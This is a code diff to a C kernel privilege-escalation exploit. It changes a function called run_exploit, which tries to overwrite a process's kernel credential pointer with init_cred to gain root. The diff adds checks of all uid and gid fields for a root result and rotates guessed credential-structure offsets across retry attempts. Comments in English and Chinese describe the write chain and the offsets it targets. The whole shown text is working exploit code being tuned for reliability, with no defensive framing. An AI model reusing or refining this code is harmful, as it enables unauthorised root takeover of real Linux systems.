@@ -575,8 +575,16 @@ int run_exploit(int argc, char **argv) {
         /* mt36: full block like ghostlock child - permanent futex wait */
         syscall(SYS_futex, &uaddr, FUTEX_WAIT, 1, NULL, NULL, 0);
         /* parent wakes us after cred write */
-        if (getuid() == 0) {
-          pr_success("mt36: CHILD-ROOT uid=0 pid=%d\n", getpid());
+        uid_t ruid, euid, suid;
+        getresuid(&ruid, &euid, &suid);
+        gid_t rgid, egid, sgid;
+        getresgid(&rgid, &egid, &sgid);
+        pr_info("mt45: child ids uid=%d euid=%d suid=%d gid=%d egid=%d sgid=%d\n",
+                getuid(), geteuid(), suid, getgid(), egid, sgid);
+        fflush(stdout);
+        if (getuid() == 0 || geteuid() == 0 || suid == 0 ||
+            getgid() == 0 || egid == 0 || sgid == 0) {
+          pr_success("mt45: CHILD-ROOT (some id field zero) pid=%d\n", getpid());
           fflush(stdout);
           _exit(42);
         }
@@ -604,7 +612,7 @@ int run_exploit(int argc, char **argv) {
         waitpid(cred_child, NULL, 0);
         return 1;
       }
-      uintptr_t cred_uid_ptr = cred_addr + 0x4;
+      uintptr_t cred_uid_ptr = cred_addr;  /* set per-attempt below */
       char pc_env[32], right_env[32], left_env[32];
       snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(cred_uid_ptr - 8));
       snprintf(left_env, sizeof(left_env), "%zx", (size_t)cred_addr);
@@ -628,6 +636,12 @@ int run_exploit(int argc, char **argv) {
       int got_root = 0;
       for (int att = 1; att <= retries && !got_root; att++) {
         uintptr_t fake_cred = P0_DATA_ALIAS_CONST(INIT_CRED); /* 2026-08-15 mt30: 写 init_cred 指针 (ghostlock W2 经验, RCU 安全) */
+        /* mt45 (P0-A): rotate uid-window candidates across attempts */
+        static const uintptr_t uid_wins[] = { 0x14, 0x4, 0x1c, 0x24 };
+        cred_uid_ptr = cred_addr + uid_wins[(att - 1) % 4];
+        snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(cred_uid_ptr - 8));
+        snprintf(left_env, sizeof(left_env), "%zx", (size_t)cred_addr);
+        pr_info("mt45: attempt %d window=%zx uid_ptr=%016zx\n", att, (size_t)uid_wins[(att-1)%4], (size_t)cred_uid_ptr);
         /* 2026-08-15 mt32: 改用 PSELECT_W* 写链 (env 优先, util.c 已修) — 不走 tree_left successor 死路
          * WPC = cred_ptr-8 (写目标: parent->rb_right = task+0x780)
          * WRIGHT = init_cred dmap (写入值)
